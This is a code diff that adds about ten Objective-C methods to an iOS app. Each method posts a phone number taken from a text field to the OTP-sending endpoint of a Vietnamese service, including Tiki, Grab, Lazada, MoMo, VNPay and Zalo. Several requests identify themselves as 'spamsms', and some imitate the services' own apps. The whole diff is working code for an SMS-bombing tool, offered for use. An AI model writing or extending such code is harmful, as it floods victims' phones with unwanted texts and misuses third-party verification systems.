@@ -1294,3 +1294,303 @@
     }];
     [dataTask resume];
 }
+
+-(void)tiki {
+    NSURL *url = [NSURL URLWithString:@"https://api.tiki.vn/user/v3/security/otp/send"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"x-device-platform": @"web",
+        @"x-guest-token": @"",
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"type\":\"register\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"tiki Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"tiki Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)grab {
+    NSURL *url = [NSURL URLWithString:@"https://api.grab.com/grabid/v1/phone/otp"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"country-code": @"VN",
+        @"app-name": @"consumer"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"+84%@\",\"type\":\"register\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"grab Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"grab Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)be {
+    NSURL *url = [NSURL URLWithString:@"https://api.be.com.vn/v2/users/otp"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"Be/3 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"x-app-platform": @"ios",
+        @"x-app-version": @"3.0.0"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"country_code\":\"84\",\"action\":\"register\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"be Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"be Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)lazada {
+    NSURL *url = [NSURL URLWithString:@"https://member.lazada.vn/user/api/sendotp"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/x-www-form-urlencoded",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"origin": @"https://www.lazada.vn",
+        @"referer": @"https://www.lazada.vn/"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *bodyString = [NSString stringWithFormat:@"phone=%@&countryCode=VN&type=register", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[bodyString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"lazada Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"lazada Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)haravan {
+    NSURL *url = [NSURL URLWithString:@"https://accounts.haravan.com/connect/phone/send_sms"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"origin": @"https://accounts.haravan.com",
+        @"referer": @"https://accounts.haravan.com/"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"action\":\"register\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"haravan Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"haravan Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)baemin {
+    NSURL *url = [NSURL URLWithString:@"https://gw.baemin.vn/member-service/v1/users/otp/send"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"BAEMIN/8 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"x-device-platform": @"ios",
+        @"x-app-version": @"8.0.0"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"phoneCode\":\"84\",\"type\":\"REGISTER\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"baemin Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"baemin Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)gojek {
+    NSURL *url = [NSURL URLWithString:@"https://api.gojek.com/goid/v1/otp/phone/send"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"Gojek/4 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"x-country-code": @"VN",
+        @"x-app-version": @"4.0.0"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone_number\":\"+84%@\",\"otp_type\":\"sms\",\"use_case\":\"registration\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"gojek Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"gojek Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)momo {
+    NSURL *url = [NSURL URLWithString:@"https://api.momo.vn/v2/gateway/api/send-otp"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"MoMo/2 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"lang": @"vi",
+        @"requesttype": @"register"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"action\":\"register\",\"language\":\"vi\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"momo Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"momo Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)vnpay {
+    NSURL *url = [NSURL URLWithString:@"https://api.vnpay.vn/v1/user/otp/send"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"VNPAY/2 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/json",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"x-platform": @"ios",
+        @"x-app-version": @"2.0.0"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"country_code\":\"84\",\"type\":\"register\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"vnpay Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"vnpay Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)zalo {
+    NSURL *url = [NSURL URLWithString:@"https://id.zalo.me/account/sendotp"];
+    NSDictionary *headers = @{
+        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
+        @"Content-Type": @"application/x-www-form-urlencoded",
+        @"accept-language": @"vi-VN,vi;q=0.9",
+        @"origin": @"https://id.zalo.me",
+        @"referer": @"https://id.zalo.me/account/register"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *bodyString = [NSString stringWithFormat:@"phone=%@&otp_type=sms&action=register", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[bodyString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"zalo Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"zalo Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
